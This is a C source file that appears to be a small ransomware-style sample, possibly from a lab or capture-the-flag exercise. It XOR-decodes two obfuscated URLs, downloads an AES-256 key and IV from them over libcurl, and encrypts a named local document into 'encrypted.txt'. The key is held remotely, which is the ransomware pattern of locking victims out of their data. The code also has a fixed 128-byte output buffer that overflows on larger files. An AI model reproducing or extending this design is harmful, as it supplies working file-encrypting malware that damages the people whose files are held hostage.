#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <curl/curl.h>
#include <stdio.h>
#include <string.h>

void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the encryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be encrypted, and obtain the encrypted output.
     * EVP_EncryptUpdate can be called multiple times if necessary
     */
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;

    /*
     * Finalise the encryption. Further ciphertext bytes may be written at
     * this stage.
     */
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

struct memory {
  char *response;
  size_t size;
};
 
static size_t cb(char *data, size_t size, size_t nmemb, void *clientp)
{
  size_t realsize = size * nmemb;
  struct memory *mem = (struct memory *)clientp;
 
  char *ptr = realloc(mem->response, mem->size + realsize + 1);
  if(!ptr)
    return 0;  /* out of memory */
 
  mem->response = ptr;
  memcpy(&(mem->response[mem->size]), data, realsize);
  mem->size += realsize;
  mem->response[mem->size] = 0;
 
  return realsize;
}

int main() {
  int bytes_read, bytes_written;
  FILE* input_file;
  FILE* output_file;
  int input_file_size;

  unsigned char encrypted_key_url[] = {0xbf, 0x0f, 0xaa, 0xbc, 0x83, 0x16, 0xbf, 0x5e, 0x00, 0xf7, 0x40, 0xdb, 0x77, 0x02, 0x05, 0x11, 0x49, 0x66, 0xea, 0x04, 0xf4, 0x8f, 0x57, 0x71, 0x4c, 0xf8, 0x4e, 0xe1, 0xfa, 0xef, 0x38, 0xa9, 0xeb};
  unsigned char encrypted_iv_url[] = {0xbf, 0x0f, 0xaa, 0xbc, 0x83, 0x16, 0xbf, 0x5e, 0x00, 0xf7, 0x40, 0xdb, 0x77, 0x02, 0x05, 0x11, 0x49, 0x66, 0xea, 0x04, 0xf4, 0x8f, 0x57, 0x71, 0x4c, 0xcb, 0x4f, 0x93, 0xbb, 0x93, 0x18, 0x9e, 0xe3};

  unsigned char key[] = {0xd7, 0x7b, 0xde, 0xcc, 0xf0, 0x2c, 0x90, 0x71, 0x70, 0x96, 0x33, 0xaf, 0x12, 0x60, 0x6c, 0x7f, 0x67, 0x05, 0x85, 0x69, 0xdb, 0xfd, 0x36, 0x06, 0x63, 0xae, 0x3c, 0xa4, 0x8c, 0xd9, 0x68, 0xfb, 0xd2};

  unsigned char key_url[34];
  unsigned char iv_url[34];

  for (int i = 0; i < 33; i++) {
    key_url[i] = encrypted_key_url[i] ^ key[i];
    iv_url[i] = encrypted_iv_url[i] ^ key[i];
  }

  key_url[33] = 0x0;
  iv_url[33] = 0x0;

  printf("%s\n", key_url);
  printf("%s\n", iv_url);

  /* ckey and ivec are the two 128-bits keys necesary to
     en- and recrypt your data.  Note that ckey can be
     192 or 256 bits as well */
//   unsigned char ckey[] = {0x82, 0xe0, 0x3a, 0xc5, 0x5e, 0xed, 0x63, 0xd4, 0x93, 0x7c, 0xd3, 0xc5, 0xe2, 0x54, 0x8f, 0x32, 0xe6, 0x4d, 0x91, 0xd0, 0xd1, 0xe3, 0x94, 0x1a, 0x56, 0x0a, 0x8e, 0x49, 0xae, 0xfa, 0x25, 0x92};
//   unsigned char ivec[] = {0xfc, 0x9d, 0x17, 0x0f, 0x36, 0xfa, 0x90, 0x03, 0x75, 0x94, 0x71, 0x81, 0xd9, 0x18, 0x3d, 0x52, 0x16, 0xe8, 0x9a, 0x72, 0xdd, 0x7b, 0x41, 0x8a, 0x3a, 0x4c, 0x71, 0xb3, 0x0e, 0xd5, 0xf3, 0x6a};

  unsigned char ckey[32];
  unsigned char ivec[32];

  CURL *curl = curl_easy_init();

  if (!curl) {
    fprintf(stderr, "[-] Failed Initializing Curl\n");
    exit(-1);
  }

  struct memory tmp = {0};

  CURLcode res_code;
  curl_easy_setopt(curl, CURLOPT_URL, key_url);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, cb);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&tmp);
  res_code = curl_easy_perform(curl);

  if (res_code != CURLE_OK) {
    fprintf(stderr, "[-] Could Not Fetch Webpage\n[+] Error : %s\n", curl_easy_strerror(res_code));
    exit(-2);
  }

  char *pos = tmp.response;
  for (size_t count = 0; count < sizeof ckey/sizeof *ckey; count++) {
    sscanf(pos, "%2hhx", &ckey[count]);
    pos += 3;
  }

  struct memory tmp1 = {0};

  curl_easy_setopt(curl, CURLOPT_URL, iv_url);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, cb);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&tmp1);
  res_code = curl_easy_perform(curl);
  
  if (res_code != CURLE_OK) {
    fprintf(stderr, "[-] Could Not Fetch Webpage\n[+] Error : %s\n", curl_easy_strerror(res_code));
    exit(-2);
  }

  pos = tmp1.response;
  for (size_t count = 0; count < sizeof ivec/sizeof *ivec; count++) {
    sscanf(pos, "%2hhx", &ivec[count]);
    pos += 3;
  }

  curl_easy_cleanup(curl);
  free(tmp.response);
  free(tmp1.response);

  input_file = fopen("very_important_document_AAAA.txt","rb");
  output_file = fopen("encrypted.txt", "wb");
  fseek(input_file, 0L, SEEK_END);
  input_file_size = ftell(input_file);
  rewind(input_file);

  unsigned char indata[input_file_size];
  unsigned char outdata[128];

  bytes_read = fread(indata, 1, input_file_size, input_file);

  bytes_read = encrypt(indata, input_file_size, ckey, ivec, outdata);

  bytes_written = fwrite(outdata, 1, bytes_read, output_file);
  if (bytes_written < 1) {
    fprintf(stderr, "Output not written to file\nWritten: %d", bytes_written);
  }
}
